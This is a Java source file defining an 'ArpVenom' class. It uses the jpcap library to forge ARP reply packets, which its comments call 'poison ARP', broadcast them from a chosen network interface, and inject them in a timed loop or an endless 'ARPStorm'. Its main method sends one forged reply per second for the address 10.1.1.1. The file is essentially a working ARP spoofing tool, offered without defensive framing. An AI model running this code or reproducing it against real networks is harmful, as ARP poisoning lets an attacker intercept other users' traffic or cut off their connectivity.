package sagittarius;

import java.io.IOException;
import java.net.InetAddress;

import sagittarius.CaptureTest;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.NetworkInterfaceAddress;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;

public class ArpVenom {

	private final SagitCapture cap; // Capture variable
	private final SagitInject inject; // Inject variable

	private jpcap.NetworkInterface[] devices; // Array of network devices

	private int deviceIndex; // Index of device you want to use
	short hardwareOctets = 6; // Length in octets of a hardware address Ethernet
								// is 6
	short protocolOctets = 4; // Length in octets of addresses of the upper
								// layer protocol IPv4 is 4
	byte[] target; // Target IP Address
	byte[] broadcast = new byte[] { (byte) 255, (byte) 255, (byte) 255,
			(byte) 255, (byte) 255, (byte) 255 }; // Broadcast Address
	ARPPacket ARP; // Arp Packet
	EthernetPacket ether; // Ethernet Frame

	private boolean isDisposed = false; // Checks if the object is disposed

	public ArpVenom() { // Default Constructor
		devices = JpcapCaptor.getDeviceList(); // Fills devices with the devices
												// on the machine
		cap = new SagitCapture(); // Creates a new Sagit Capture object
		inject = new SagitInject(); // Creates a new Sagit Inject object
	}

	public void openDevice(int index) { // Opens the device takes in index
		cap.openDevice(index); // Has cap open the device feed by the index
		inject.openDevice(index); // Has inject do the same thing
	}

	public void dispose() { // Method to close the open device
		cap.dispose(); // Disposes cap
		inject.dispose(); // Disposes inject
		isDisposed = true; // Sets isDisposed to true to tell both are disposed
	}

	public boolean isDisposed() { // Checks isDisposed
		return isDisposed;
	}

	public int getDeviceCount() { // Method to get the number of available
									// devices
		return devices.length; // returns the length of devices
	}

	public int getCurrentDevice() { // Method to get the index of the current
									// device
		return deviceIndex; // Returns the deviceIndex instance variable
	}

	public byte[] getInterfaceMAC(int index) { // Helper Method to get the
												// interface MAC
		return devices[deviceIndex].mac_address;
	}

	// Unique to ARP
	public EthernetPacket etherGen(int deviceIndex, ARPPacket p) { // Helper
																	// method to
																	// create
																	// the frame
		ether = new EthernetPacket(); // Creates a new ethernet frame
		ether.frametype = EthernetPacket.ETHERTYPE_ARP; // Makes the frame type
														// ARP
		ether.src_mac = devices[deviceIndex].mac_address; // Sets the source mac
															// to the opened
															// device
		ether.dst_mac = broadcast; // Makes the frame broadcast to everyone
		p.datalink = ether; // Sets the data of the the ARP packet to this frame
		return ether; // Returns the frame
	}

	public ARPPacket ARPGen(byte[] targetIP) { // Poison Arp Generation

		ArpVenom temp = new ArpVenom(); // Temporary calling object
		ARP = new ARPPacket(); // Creates a new empty arp packet object
		ARP.hlen = hardwareOctets; // Sets the hardware length to hardware
									// Octets
		ARP.plen = protocolOctets; // Sets the protocol length to protocol
									// Octets
		ARP.prototype = ARPPacket.PROTOTYPE_IP; // Sets the protocol to IP
		ARP.hardtype = ARPPacket.HARDTYPE_ETHER; // Sets the hardware type to
													// ether
		ARP.operation = ARPPacket.ARP_REPLY; // Sets the packet operation in
												// this case a reply

		ARP.sender_hardaddr = temp.getInterfaceMAC(deviceIndex);
		// Sets the sender hardware address to the chosen device
		ARP.target_hardaddr = broadcast;
		// Sets the target hardware address to the broadcast variable

		ARP.target_protoaddr = targetIP; // Sets the target IP address to the
											// target
		ARP.sender_protoaddr = temp.getIP(deviceIndex); // Sets the sender IP
														// address by calling
														// getIP

		ARP.datalink = this.etherGen(0, ARP);
		// Sets the ARP variable data link to an ethernet frame generated by
		// etherGen
		return ARP; // Returns the ARP packet
	}

	public byte[] getIP(int deviceIndex) { // Grabs the IP address of the chosen
											// device
		NetworkInterface local = devices[deviceIndex];
		// Grabs the Network Interface object representing the chosen device
		NetworkInterfaceAddress[] Inet = local.addresses;
		// Grabs both the IP and MAC addresses of the device called local
		InetAddress temp; // Variable to hold the Inet address representation of
							// the Ip address
		byte[] address; // Variable to hold the byte representation
		temp = Inet[0].address;
		// Sets Temp equal to element 0 in the address array which is the IP
		// address
		address = temp.getAddress();
		// Calls getAddress to grab the byte array representation and places it
		// in address
		return address; // Returns address
	}

	public void ARPStorm(byte[] targetIP) { // Generates a storm of poison ARPs
		boolean kill = true; // A kill control variable
		while (kill == true) { // While kill is true
			ARPPacket p = this.ARPGen(targetIP);
			// Generate a new ARP packet targeted at the targetIP parameter
			inject.inject(p); // Injects the poison
		}
	}

	public void Inject(ARPPacket p) { // Inject method
		inject.inject(p); // Calls inject from SagitInject to send the packet
	}

	public Thread timedInject(final ARPPacket p, final long milliseconds,
			final int deviceIndex) {

		Runnable runnable = new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				while (true) {
					try {
						inject.inject(p);
						System.out.println("I was sent!");
						Thread.sleep(milliseconds);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

				}

			};
		};

		Thread injectThread = new Thread(runnable);
		injectThread.setName("injector");
		injectThread.start();
		return injectThread;
	}
	

	public Thread timedInject(final ARPPacket p, final long milliseconds,
			final  int count, 	final int deviceIndex) {

		Runnable runnable = new Runnable() {
			@Override
			public void run() {
				int sent = 0;
				// TODO Auto-generated method stub
				while(true){
					if (sent >= count)
						break;
					try {
						inject.inject(p);
						System.out.println("I was sent!");
						Thread.sleep(milliseconds);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					if (count > 0){
						sent++;
					}


				}

			};
		};

		Thread injectThread = new Thread(runnable);
		injectThread.setName("injector");
		injectThread.start();
		return injectThread;
	}

	public static void main(String[] args) {

		ArpVenom test = new ArpVenom();
		test.openDevice(0);
		byte[] rep = new byte[] { (byte) 10, (byte) 1, (byte) 1, (byte) 1 };
		// test.ARPStorm(rep);
		ARPPacket p = test.ARPGen(rep);
		test.timedInject(p, 1000, 0);

	}

}
